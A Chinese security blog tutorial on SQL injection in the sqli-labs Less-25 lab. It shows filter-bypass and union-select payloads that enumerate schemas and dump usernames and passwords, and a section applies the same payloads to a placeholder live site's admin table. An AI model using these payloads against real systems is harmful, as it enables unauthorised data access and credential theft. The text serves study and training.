datetime="2026-06-01T12:59:18.036Z" title="Updated 2026-06-01 12:59:18">2026-06-01</time></header><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<span id="more"></span>
+
+<hr>
+<p class='p center logo large'>前置申明</p>
+
+<p>本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的<img class="inline-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/security/DaoVoice.png" style="height:30px"/>图标与我联系吧</p>
+<p>本博客的所有<mark class="hl-label red">Security</mark> 大类下的文章只能作为<wavy>学习研究使用</wavy>，<emp>不可用于非法测试和攻击</emp>，请遵循网络安全法，<span class='p green'>共筑和谐网络</span></p>
+<p>如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标<img class="inline-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/security/webpushr.png" style="height:30px"/>开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功）</p>
+<p>中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。</p>
+<div class="img-wrap"><div class="img-bg"><img class="img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/security/wangluoanquanfa.png" style="width:300px;"/></div></div>
+
+<hr>
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><blockquote>
+<p>  sql 注入大致分为3类分别为 <code>白盒绕过</code> <code>黑盒绕过</code> <code>fuzz测试</code>  </p>
+</blockquote>
+<h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><blockquote>
+<p>  **说明：**此次练习的环境是基于 windows7 下用 phpStudy2018 搭建的 sqli-labs 靶场以 Less-25 关卡进行演示</p>
+</blockquote>
+<h2 id="重置sqli-labs数据库"><a href="#重置sqli-labs数据库" class="headerlink" title="重置sqli-labs数据库"></a>重置sqli-labs数据库</h2><blockquote>
+<p>  我这边是因为之前做用工具对靶场进行了安全扫描 怕有一些干扰因此先重置一下防止出问题</p>
+<p>  如果是第一次部署sqli-labs 需要将 <code>sqli\sql-connections\db-creds.inc</code> 文件中的数据库密码进行配置 大概是在第五行 <code>$dbpass =&#39;你的数据库密码&#39;;</code></p>
+<p>  重置数据库时候需要将 php 版本需要选择 5.2.17</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210805203915774.png" alt="重置sqli-labs数据库"></p>
+<h2 id="调整php版本"><a href="#调整php版本" class="headerlink" title="调整php版本"></a>调整php版本</h2><blockquote>
+<p>  在 sqli-labs 进行注入的时候,php版本需要选择5.4.45 如果低于这个版本会出现一些错误 也就是上面改成低版本这里又要改改回5.4.45了</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210805201508820.png" alt="phpStudy 环境设置"></p>
+<h2 id="输出-sql-语句"><a href="#输出-sql-语句" class="headerlink" title="输出 sql 语句"></a>输出 sql 语句</h2><blockquote>
+<p>  为了方便展示，我们需要在执行 sql 注入的时候查看一下我们的执行语句，因此在对应的关卡中加入输入 语法如下 如果是docker启动的 那么该文件在 <code>/var/www/html/Less-25/index.php</code> 修改前最好备份.bak</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210805205834990.png" alt="加入 echo 输出执行的 sql 语句"></p>
+<h2 id="修改Less-1的请求方式"><a href="#修改Less-1的请求方式" class="headerlink" title="修改Less-1的请求方式"></a>修改Less-1的请求方式</h2><blockquote>
+<p>将Less-1 关卡中index.php 中默认的get请求替换为 RESUEST 这样可以同时支持 get 和 post 方便练习</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806134109549.png" alt="修改Less-1的请求方式"></p>
+<h2 id="mysql中的注释"><a href="#mysql中的注释" class="headerlink" title="mysql中的注释"></a>mysql中的注释</h2><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 不带注释</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">#通过注释符号【#】号注释</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="comment">-- 通过减减空格注释</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806140733990.png" alt="注释符"></p>
+<h3 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="comment">/*这是mysql的多行注释只要注释体内就不会影响外面的*/</span><span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806141408336.png" alt="多行注释"></p>
+<h3 id="特殊注释"><a href="#特殊注释" class="headerlink" title="特殊注释"></a>特殊注释</h3><blockquote>
+<p>  其实这里我也有点蒙，看了一些资料说的是数字小于mysql的版本就会执行 但是这个第二条 51000 又没有执行出来 所以还是不要卡太死  这个是mysql的一个特性 根据版本号有关</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="comment">/*!60000 DATABASE(),*/</span> VERSION();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="comment">/*!51000 DATABASE(),*/</span> VERSION();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="comment">/*!50000 DATABASE(),*/</span> VERSION();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="comment">/*!40000 DATABASE(),*/</span> VERSION();</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806171400427.png" alt="mysql的特殊注释"></p>
+<h2 id="mysql中的换行"><a href="#mysql中的换行" class="headerlink" title="mysql中的换行"></a>mysql中的换行</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 用HackBar 进行测试的时候换行符号用 %0a 表示</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>#ssssihhigiugiusgiug</span><br><span class="line">,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806190215797.png" alt="mysql 终端换行"></p>
+<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h2 id="白盒绕过"><a href="#白盒绕过" class="headerlink" title="白盒绕过"></a>白盒绕过</h2><blockquote>
+<p>通过源代码分析,来进行绕过 例:less-25 当前用的腾讯云上 docker 安装的 sqli-labs 并未安装安全狗防护</p>
+</blockquote>
+<h3 id="执行-id-1"><a href="#执行-id-1" class="headerlink" title="执行 id&#x3D;1"></a>执行 id&#x3D;1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通过HackBar执行 显示正常</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210805234221106.png" alt="执行 id&#x3D;1"></p>
+<h3 id="执行-id-1’"><a href="#执行-id-1’" class="headerlink" title="执行 id&#x3D;1’"></a>执行 id&#x3D;1’</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 此时报错,说明存在漏洞</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210805234643672.png" alt="执行 id&#x3D;1&#39;"></p>
+<h3 id="执行id-1’-orderby-1-–"><a href="#执行id-1’-orderby-1-–" class="headerlink" title="执行id&#x3D;1’ orderby 1 –+"></a>执行id&#x3D;1’ orderby 1 –+</h3><blockquote>
+<p>使用 order by 语句发现报错,无法使用，观察打印出来的原因是过滤了 <code>or</code></p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; orderby 1 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210805235249963.png" alt="执行id&#x3D;1&#39; orderby 1 --+"></p>
+<h3 id="尝试双写-oorrderby"><a href="#尝试双写-oorrderby" class="headerlink" title="尝试双写 oorrderby"></a>尝试双写 oorrderby</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 返回正常，并且能判断有3列</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> oorrderby <span class="number">1</span> <span class="comment">--+ </span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806001553390.png" alt="尝试双写 oorrderby"></p>
+<h3 id="执行id-1’-and-‘1’-’1"><a href="#执行id-1’-and-‘1’-’1" class="headerlink" title="执行id&#x3D;1’ and ‘1’&#x3D;’1"></a>执行id&#x3D;1’ and ‘1’&#x3D;’1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806002400223.png" alt="执行id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1"></p>
+<h3 id="尝试双写-aandnd"><a href="#尝试双写-aandnd" class="headerlink" title="尝试双写 aandnd"></a>尝试双写 aandnd</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; aandnd &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806002847954.png" alt="尝试双写 aandnd"></p>
+<h3 id="执行union-select回显"><a href="#执行union-select回显" class="headerlink" title="执行union select回显"></a>执行union select回显</h3><h4 id="查看是否支持回显"><a href="#查看是否支持回显" class="headerlink" title="查看是否支持回显"></a>查看是否支持回显</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 5 6支持回显</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 4,5,6 --+ </span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806003934417.png" alt="执行union select查看回显"></p>
+<h4 id="union-select-回显查询当前的库"><a href="#union-select-回显查询当前的库" class="headerlink" title="union select 回显查询当前的库"></a>union select 回显查询当前的库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询当前的库</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 4,5,database() --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806004234410.png" alt="union select 回显查看当前的库名"></p>
+<h4 id="查看所有的库"><a href="#查看所有的库" class="headerlink" title="查看所有的库"></a>查看所有的库</h4><blockquote>
+<p>  group_concat()拼接函数拼接括号里面的那个字段，查询所有的库把所有的结果拼接起来 <code>infoorrmation</code> 要双写因为上面测试发现 <code>or</code> 被过滤掉了</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 4,5,group_concat(schema_name) from infoorrmation_schema.schemata --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806010107176.png" alt="查看所有的库"></p>
+<h4 id="查看security库下的表"><a href="#查看security库下的表" class="headerlink" title="查看security库下的表"></a>查看security库下的表</h4><blockquote>
+<p>通过上面database()我们已经知道了当前的库名为 security,那么可以对其查询下面的表有哪些 <code>infoorrmation</code> 要双写因为上面测试发现 <code>or</code> 被过滤掉了0x7365637572697479 为16进制编码后的security %23 为【- - +】url编码后的值</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 4,5,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x7365637572697479 %23</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806011439575.png" alt="查看security库下的表"></p>
+<h4 id="查看users表有哪些字段"><a href="#查看users表有哪些字段" class="headerlink" title="查看users表有哪些字段"></a>查看users表有哪些字段</h4><blockquote>
+<p>  <code>infoorrmation</code> 和 <code>aandnd</code> 要双写因为上面测试发现 <code>or</code>  <code>and</code> 都被过滤掉了</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27;  aandnd table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806012352980.png" alt="查看users表有哪些字段"></p>
+<h4 id="查看security-users表下-username-password-的值"><a href="#查看security-users表下-username-password-的值" class="headerlink" title="查看security.users表下 username,password 的值"></a>查看security.users表下 username,password 的值</h4><blockquote>
+<p>  查看security.users表下 username,password 的值 <code>passwoorrd</code> 要双写，要双写因为上面测试发现 <code>or</code> 被过滤掉了 0X23是 #号通过16进制编码后的结果 concat_ws函数是拼接字段的函数</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli:<span class="number">8200</span><span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(concat_ws(0x23,username,passwoorrd)) from security.users --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806013642848.png" alt="查看security.users表下 username,password 的值"></p>
+<h2 id="线上环境练习"><a href="#线上环境练习" class="headerlink" title="线上环境练习"></a>线上环境练习</h2><h3 id="查看是都存在漏洞"><a href="#查看是都存在漏洞" class="headerlink" title="查看是都存在漏洞"></a>查看是都存在漏洞</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 返回正常</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.xxx.com<span class="operator">/</span>view_detail.asp?id<span class="operator">=</span><span class="number">91</span></span><br><span class="line"><span class="comment">-- 报错，说明存在注入</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.xxx.com<span class="operator">/</span>view_detail.asp?id<span class="operator">=</span><span class="number">91</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="order-by查看有多少列"><a href="#order-by查看有多少列" class="headerlink" title="order by查看有多少列"></a>order by查看有多少列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.xxx.com<span class="operator">/</span>view_detail.asp?id<span class="operator">=</span><span class="number">91</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">6</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.xxx<span class="operator">/</span>view_detail.asp?id<span class="operator">=</span><span class="number">91</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">7</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806015407544.png" alt="order by查看有多少列"></p>
+<h3 id="查看可回显的字段"><a href="#查看可回显的字段" class="headerlink" title="查看可回显的字段"></a>查看可回显的字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.xxx.com<span class="operator">/</span>view_detail.asp?id<span class="operator">=</span><span class="number">91</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.xxx.com<span class="operator">/</span>view_detail.asp?id<span class="operator">=</span><span class="number">91</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.xxx.com<span class="operator">/</span>view_detail.asp?id<span class="operator">=</span><span class="number">91</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> admin_user</span><br><span class="line"><span class="comment">-- 下面就可以进行其它的操作了,更多参考：http://testingpai.com/article/1618882195644</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806020859855.png" alt="查看可回显的字段"></p>
+<h2 id="黑盒绕过"><a href="#黑盒绕过" class="headerlink" title="黑盒绕过"></a>黑盒绕过</h2><h3 id="绕过的四大分类"><a href="#绕过的四大分类" class="headerlink" title="绕过的四大分类"></a>绕过的四大分类</h3><blockquote>
+<ul>
+<li>架构层面绕过waf</li>
+<li>资源限制角度绕过waf</li>
+<li>协议层面绕过waf</li>
+<li>规则层面的绕过waf</li>
+</ul>
+</blockquote>
+<h3 id="架构层面绕过waf"><a href="#架构层面绕过waf" class="headerlink" title="架构层面绕过waf"></a>架构层面绕过waf</h3><h4 id="寻找源网站绕过-waf-检测"><a href="#寻找源网站绕过-waf-检测" class="headerlink" title="寻找源网站绕过 waf 检测"></a>寻找源网站绕过 waf 检测</h4><blockquote>
